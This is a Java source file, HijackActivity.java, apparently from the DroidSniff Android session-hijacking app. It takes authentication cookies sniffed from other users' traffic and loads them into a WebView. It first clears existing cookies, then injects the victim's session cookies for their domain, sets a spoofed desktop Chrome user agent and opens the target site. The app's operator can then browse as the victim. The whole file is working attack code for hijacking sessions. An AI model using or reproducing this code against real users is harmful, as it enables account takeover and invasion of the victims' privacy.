/*
 * HijackActivity.java is the WebView Activity setting up the cookies Copyright
 * (C) 2011 Andreas Koch <koch.trier@gmail.com>
 * 
 * This software was supported by the University of Trier
 * 
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 3 of the License, or (at your option) any later
 * version.
 * 
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 * 
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package com.evozi.droidsniff.activities;

import org.apache.http.cookie.Cookie;

import com.actionbarsherlock.app.SherlockActivity;
import com.evozi.droidsniff.auth.Auth;
import com.evozi.droidsniff.helper.Constants;
import com.evozi.droidsniff.objects.CookieWrapper;

import android.app.AlertDialog;
import android.content.DialogInterface;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import com.actionbarsherlock.view.Menu;
import com.actionbarsherlock.view.MenuItem;
import com.actionbarsherlock.view.Window;

import android.webkit.CookieManager;
import android.webkit.CookieSyncManager;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.EditText;
import android.widget.Toast;
import com.evozi.droidsniff.R;

public class HijackActivity extends SherlockActivity implements Constants {
	private WebView webview = null;
	private Auth authToHijack = null;

	private class MyWebViewClient extends WebViewClient {
		@Override
		public boolean shouldOverrideUrlLoading(WebView view, String url) {
			view.loadUrl(url);
			return true;
		}
	}

	private void setupCookies() {
		Log.i(APPLICATION_TAG,
				"######################## COOKIE SETUP ###############################");
		CookieManager manager = CookieManager.getInstance();
		Log.i(APPLICATION_TAG,
				"Cookiemanager has cookies: "
						+ (manager.hasCookies() ? "YES" : "NO"));
		if (manager.hasCookies()) {
			manager.removeAllCookie();
			try {
				Thread.sleep(3000);
			} catch (InterruptedException e) {
			}
			Log.i(APPLICATION_TAG, "Cookiemanager has still cookies: "
					+ (manager.hasCookies() ? "YES" : "NO"));
		}
		Log.i(APPLICATION_TAG,
				"######################## COOKIE SETUP START ###############################");
		for (CookieWrapper cookieWrapper : authToHijack.getCookies()) {
			Cookie cookie = cookieWrapper.getCookie();
			String cookieString = cookie.getName() + "=" + cookie.getValue()
					+ "; domain=" + cookie.getDomain() + "; Path="
					+ cookie.getPath();
			Log.i(APPLICATION_TAG, "Setting up cookie: " + cookieString);
			manager.setCookie(cookie.getDomain(), cookieString);
		}
		CookieSyncManager.getInstance().sync();
		Log.i(APPLICATION_TAG,
				"######################## COOKIE SETUP DONE ###############################");
	}

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		requestWindowFeature(Window.FEATURE_INDETERMINATE_PROGRESS);
		requestWindowFeature(Window.FEATURE_PROGRESS);
		setContentView(R.layout.webview);

		getSupportActionBar().setDisplayHomeAsUpEnabled(true);
		setSupportProgressBarIndeterminateVisibility(false);

		CookieSyncManager.createInstance(this);
	}

	private void setupWebView() {
		webview = (WebView) findViewById(R.id.webviewhijack);
		webview.setWebViewClient(new MyWebViewClient());
		WebSettings webSettings = webview.getSettings();
		// webSettings.setUserAgentString("foo");
		webSettings
				.setUserAgentString("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6");
		webSettings.setJavaScriptEnabled(true);
		webSettings.setAppCacheEnabled(false);
		webSettings.setBuiltInZoomControls(true);
		webview.setWebChromeClient(new WebChromeClient() {
			public void onProgressChanged(WebView view, int progress) {
				getSupportActionBar().setSubtitle(
						HijackActivity.this.webview.getUrl());
				setSupportProgressBarIndeterminateVisibility(true);

				// Normalize our progress along the progress bar's scale
				int mmprogress = (Window.PROGRESS_END - Window.PROGRESS_START)
						/ 100 * progress;
				setSupportProgress(mmprogress);

				if (progress == 100) {
					setSupportProgressBarIndeterminateVisibility(false);
				}

			}
		});
	}

	@Override
	public boolean onKeyDown(int keyCode, KeyEvent event) {
		if ((keyCode == KeyEvent.KEYCODE_BACK) && webview.canGoBack()) {
			webview.goBack();
			return true;
		}
		return super.onKeyDown(keyCode, event);
	}

	// Menu Items
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		super.onCreateOptionsMenu(menu);
		MenuItem menu0 = menu.add(0, 0, 0, getString(R.string.back));
		menu0.setIcon(R.drawable.ab_navigation_back);
		menu0.setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM);

		MenuItem menu1 = menu.add(0, 1, 0, getString(R.string.forward));
		menu1.setIcon(R.drawable.ab_navigation_forward);
		menu1.setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM);

		MenuItem menu2 = menu.add(1, 2, 0, getString(R.string.reload));
		menu2.setIcon(R.drawable.ab_navigation_refresh);
		menu2.setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM);

		MenuItem menu3 = menu.add(1, 3, 0, getString(R.string.changeurl));
		menu3.setIcon(R.drawable.ab_location_web_site);
		menu3.setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		switch (item.getItemId()) {
		case android.R.id.home:
			this.finish();
			break;
		case 0:
			if (webview.canGoBack())
				webview.goBack();
			break;
		case 1:
			if (webview.canGoForward())
				webview.goForward();
			break;
		case 2:
			webview.reload();
			break;
		case 3:
			selectURL();
			break;
		}
		return false;
	}

	private void selectURL() {
		AlertDialog.Builder alert = new AlertDialog.Builder(this);

		alert.setTitle(getString(R.string.changeurl));
		alert.setMessage(getString(R.string.customurl));

		// Set an EditText view to get user input
		final EditText inputName = new EditText(this);
		inputName.setText(HijackActivity.this.webview.getUrl());
		alert.setView(inputName);

		alert.setPositiveButton("Go", new DialogInterface.OnClickListener() {
			public void onClick(DialogInterface dialog, int whichButton) {
				HijackActivity.this.webview.loadUrl(inputName.getText()
						.toString());
			}
		});

		alert.show();
	}

	@Override
	protected void onStart() {
		super.onStart();

		Object o = this.getIntent().getExtras()
				.getSerializable(ListenActivity.BUNDLE_KEY_AUTH);
		authToHijack = (Auth) o;

		if (authToHijack == null) {
			Toast.makeText(this,
					"Sorry, there was an error loading this Authentication",
					Toast.LENGTH_LONG).show();
			finish();
			return;
		}

		boolean mobile = this.getIntent().getExtras().getBoolean("MOBILE");
		String url = mobile ? authToHijack.getMobileUrl() : authToHijack
				.getUrl();

		setupWebView();
		setupCookies();
		webview.loadUrl(url);
	}

	@Override
	protected void onStop() {
		super.onPause();
		finish();
	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
	}

}